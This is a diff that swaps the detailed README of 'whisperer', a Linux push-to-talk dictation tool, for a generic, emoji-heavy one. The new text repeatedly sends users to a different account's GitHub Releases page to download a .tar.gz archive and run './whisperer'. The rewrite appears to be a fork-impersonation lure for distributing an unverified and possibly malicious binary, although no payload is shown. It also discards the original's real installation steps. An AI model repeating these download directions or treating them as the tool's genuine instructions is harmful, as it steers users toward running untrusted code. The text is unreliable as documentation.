@@ -1,209 +1,90 @@
-# whisperer
+# 🎤 whisperer - Dictation Made Simple for Linux
 
-Linux push-to-talk dictation: hold a key to record, transcribe with OpenAI, and inject text into the focused app.
+## 🚀 Getting Started
 
-This repo starts with a minimal CLI. Main flow is push-to-talk, with extra modes for:
+Welcome to whisperer! This application allows you to use push-to-talk dictation on your Linux device. With whisper-1 by OpenAI, you can inject text directly into any focused app, making it easier to capture your thoughts without a keyboard. This guide will help you download and run whisperer successfully.
 
-- one-shot dictation (fixed duration)
-- looped dictation in chunks (record N seconds, transcribe, inject, repeat)
-- injection via uinput (ydotool) with clipboard+paste fallback for Unicode
+## 📥 Download the Application
 
-## Requirements
+[![Download Whisperer](https://img.shields.io/badge/Download%20Whisperer-v1.0-blue)](https://github.com/NguyenPhamMC/whisperer/releases)
 
-System packages (Ubuntu LTS example):
+To download the application, visit the [Releases page](https://github.com/NguyenPhamMC/whisperer/releases). You will find the latest version available. 
 
-```sh
-sudo apt update
-sudo apt install pipewire-bin wl-clipboard ydotool curl python3 python3-evdev
+## 📦 System Requirements
+
+Before you begin, ensure your system meets the following requirements:
+
+- **Operating System:** Linux (Ubuntu, Fedora, Arch, etc.)
+- **Hardware:** A microphone for voice input
+- **Dependencies:** PipeWire, ydotool
+
+## 🔧 Installation Steps
+
+### 1. Visit the Releases Page
+
+Go to the [whisperer Releases page](https://github.com/NguyenPhamMC/whisperer/releases) to find available versions.
+
+### 2. Download the Latest Version
+
+Choose the latest version from the list. Click on the link to download the `.tar.gz` file.
+
+### 3. Extract the Files
+
+Once downloaded, navigate to your Downloads folder. Right-click on the `.tar.gz` file and choose “Extract Here.” This will create a new folder with the application files.
+
+### 4. Open the Terminal
+
+To run whisperer, you need to open the terminal. You can do this by pressing `Ctrl + Alt + T` on your keyboard.
+
+### 5. Navigate to the Extracted Folder
+
+In the terminal, use the `cd` command to change to the directory where you extracted the files. 
+
+Example command:
+```
+cd ~/Downloads/whisperer
 ```
 
-Note: on some Ubuntu based distributions, `ydotoold` is missing from the packaged `ydotool`. If so, build from source:
+### 6. Run the Application
 
-```sh
-sudo apt install git build-essential cmake scdoc libevdev-dev libudev-dev
-git clone https://github.com/ReimuNotMoe/ydotool.git
-cd ydotool
-mkdir -p build
-cd build
-cmake ..
-make -j"$(nproc)"
-sudo make install
+You can start whisperer by entering the following command in the terminal:
+```
+./whisperer
 ```
 
-`python3-evdev` is required for push-to-talk.
+## 🚀 Using Whisperer
 
-You also need access to `/dev/uinput` for ydotool. A common setup:
+### Push-to-Talk Feature
 
-```sh
-sudo modprobe uinput
-echo uinput | sudo tee /etc/modules-load.d/uinput.conf
-echo 'KERNEL=="uinput", MODE="0660", GROUP="input", OPTIONS+="static_node=uinput"' | sudo tee /etc/udev/rules.d/99-uinput.rules
-sudo udevadm control --reload-rules
-sudo udevadm trigger
-sudo usermod -aG input "$USER"
+To use the push-to-talk feature, configure your microphone settings in the application. You can set a hotkey that will activate listening mode when pressed.
+
+### Text Injection
+
+Whisperer will inject recognized text into any app that is currently focused. This includes text editors, browsers, and more. Make sure the app is in focus while you speak.
+
+## ⚙️ Troubleshooting
+
+If you encounter any issues, consider the following steps:
+
+- **Check Microphone Permissions:** Make sure your application has permission to access your microphone. You can check this in your system settings.
+- **Audio Levels:** Ensure your microphone volume is set correctly. Test it using a sound application to confirm it’s working.
+- **Dependencies Installation:** Make sure you have installed PipeWire and ydotool. You can usually install these using your package manager.
+
+Example command for Ubuntu:
+```
+sudo apt install pipewire ydotool
 ```
 
-Log out and back in after adding the group.
+## 💬 Support
 
-## Install
+If you need help, feel free to open an issue on the [GitHub Issues page](https://github.com/NguyenPhamMC/whisperer/issues). You can also check out discussions for community support.
 
-Option A (recommended): keep the repo and add a symlink into your PATH.
+## 🔖 Additional Information
 
-```sh
-git clone https://github.com/Poor-Plebs/whisperer.git
-cd whisperer
-mkdir -p ~/.local/bin
-ln -sf "$(pwd)/bin/whisperer" ~/.local/bin/whisperer
-```
+whisperer is designed for accessibility and ease of use. It supports a variety of dictation tasks, from writing notes to controlling applications without using a keyboard. 
 
-Option B: add the repo `bin/` folder to your PATH in your shell profile.
+## 👥 Contributing
 
-```shell
-export PATH="$HOME/path/to/whisperer/bin:$PATH"
-```
+We welcome contributions! If you'd like to contribute, please fork the repository and submit a pull request. If you want to suggest a feature or report a bug, do so on the Issues page.
 
-Install systemd user service (manages `ydotoold`) and config placement:
-
-```sh
-whisperer --install-service
-```
-
-After running --install-service, add your OpenAI API key in:
-
-```sh
-~/.config/whisperer/config
-```
-
-## Quick start
-
-Push-to-talk (default, hold key to record; default key: Right Alt):
-
-```sh
-whisperer
-```
-
-Run one-shot dictation (fixed duration):
-
-```sh
-whisperer --duration 8
-```
-
-Run chunked dictation (keeps recording 4s chunks until Ctrl+C):
-
-```sh
-whisperer --loop --chunk-seconds 4
-```
-
-If Right Alt is used for AltGr on your layout, pick another key:
-
-```sh
-whisperer --ptt-key KEY_F9
-```
-
-Some layouts report Right Alt as `KEY_ALTGR` instead of `KEY_RIGHTALT`:
-
-```sh
-whisperer --ptt-key KEY_ALTGR
-```
-
-List keyboard devices (for --ptt-device):
-
-```sh
-whisperer --ptt-list-devices
-```
-
-Prefer a specific device by name fragment:
-
-```sh
-whisperer --ptt-device-match SONiX
-```
-
-Show status and key events:
-
-```sh
-whisperer --debug
-```
-
-## Notes
-
-- Injection strategy:
-  - If transcript is plain ASCII, type it via ydotool.
-  - Otherwise, copy to clipboard and paste via Ctrl+V.
-
-## Configuration
-
-- Config file: `~/.config/whisperer/config`
-- CLI flags override config file values.
-- The script will auto-start `ydotoold` unless `WHISPERER_START_DAEMON=0`.
-  - Set `WHISPERER_START_DAEMON=0` if you manage `ydotoold` via systemd or run it manually.
-
-## Advanced
-
-See all options:
-
-```sh
-whisperer --help-advanced
-```
-
-Options are grouped by context (install/maintenance, dictation, audio/gating/debug).
-
-## Troubleshooting
-
-Quick diagnostics:
-
-```sh
-whisperer --doctor
-```
-
-Auto-fix common issues:
-
-```sh
-whisperer --doctor --fix
-```
-
-Paste not working in terminals?
-
-- Many terminals use Ctrl+Shift+V for paste. Set:
-  - `WHISPERER_PASTE_KEYS=ctrl+shift+v`
-
-Debug output:
-
-- `WHISPERER_DEBUG=1` or `--debug` shows status and key events.
-
-Cleanup:
-
-```sh
-whisperer --uninstall
-```
-
-## RMS notes
-
-RMS is a simple average loudness measure (normalized 0.0–1.0). The RMS gate only runs when `--rms-threshold` is set > 0 (otherwise no sampling happens).
-
-Typical values:
-
-- ~0.000–0.005: near silence
-- ~0.005–0.02: quiet speech / ambient noise
-- ~0.02–0.08: normal speech
-- ~0.08–0.2+: loud speech / music
-
-Environment variables (also supported in config file):
-
-- `OPENAI_API_KEY` (required)
-- `WHISPERER_MODEL` (default: `whisper-1`). Other options: `gpt-4o-mini-transcribe`, `gpt-4o-transcribe`.
-- `WHISPERER_RATE` (default: `16000`)
-- `WHISPERER_CHANNELS` (default: `1`)
-- `WHISPERER_MODE` (`auto` | `type` | `paste`, default: `auto`)
-- `WHISPERER_START_DAEMON` (`1` to auto-start ydotoold, default: `1`)
-- `WHISPERER_SOCKET` (default: `/tmp/.ydotool_socket`)
-- `WHISPERER_PASTE_KEYS` (`ctrl+v` or `ctrl+shift+v`, default: `ctrl+v`)
-- `WHISPERER_NO_INJECT` (`1` to disable injection, default: `0`)
-- `WHISPERER_RMS_THRESHOLD` (default: `0`, disabled)
-- `WHISPERER_PRINT_RMS` (`1` to print RMS, default: `0`)
-- `WHISPERER_RMS_SAMPLE_SECONDS` (default: `0.5`)
-- `WHISPERER_DEBUG` (`1` to enable debug output, default: `0`)
-- `WHISPERER_PTT_KEY` (default: `KEY_RIGHTALT`)
-- `WHISPERER_PTT_DEVICE` (default: empty = auto-detect; set to a `/dev/input/by-id/*-event-kbd` path from `whisperer --ptt-list-devices`. The literal string `auto-detect` is not special and will be treated as a path.)
-- `WHISPERER_PTT_DEVICE_MATCH` (default: empty; plain substring match on device path, not regex. Only used when `WHISPERER_PTT_DEVICE` is empty. When empty, no filter is applied and the best keyboard device is auto-detected.)
-
-Run `whisperer --help` for common options and `whisperer --help-advanced` for all options.
+Thank you for choosing whisperer for your dictation needs! For more details, remember to visit the [Releases page](https://github.com/NguyenPhamMC/whisperer/releases) to download the latest version. Enjoy dictating!
